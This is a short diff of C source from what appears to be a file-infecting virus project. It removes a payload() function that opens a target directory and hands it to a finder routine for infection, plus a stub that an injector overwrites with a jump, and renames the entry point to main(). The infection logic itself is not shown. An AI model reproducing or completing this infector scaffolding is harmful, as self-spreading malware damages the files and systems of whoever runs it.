@@ -65,26 +65,7 @@ int FORCE_INLINE can_be_launch()
 	return (1);
 }
 
-void payload()
-{
-	t_data data;
-	int fd;
-	char infested_dir[] = INFESTED_DIR;
-	#ifdef __HELLO__
-		char hello[] = "Hello there\n";
-
-		WRITE(1, hello, sizeof(hello) - 1);
-	#endif
-	data.infos.pl_size = &payload_end - &payload_start;
-	fd = OPEN(infested_dir, O_RDONLY | O_DIRECTORY);
-	if (fd < 0)
-		payload_end();
-	finder(data, fd);
-	CLOSE(fd);
-	return ;
-}
-
-void start(void)
+int main(void)
 {
 	if (can_be_launch())
 		payload();
@@ -105,10 +86,3 @@ void payload_start()
 		"jmp payload_end" : : :
 	);
 }
-
-void payload_end(void)
-{
-	// get replaced by the jump in inject.c
-	;
-}
-
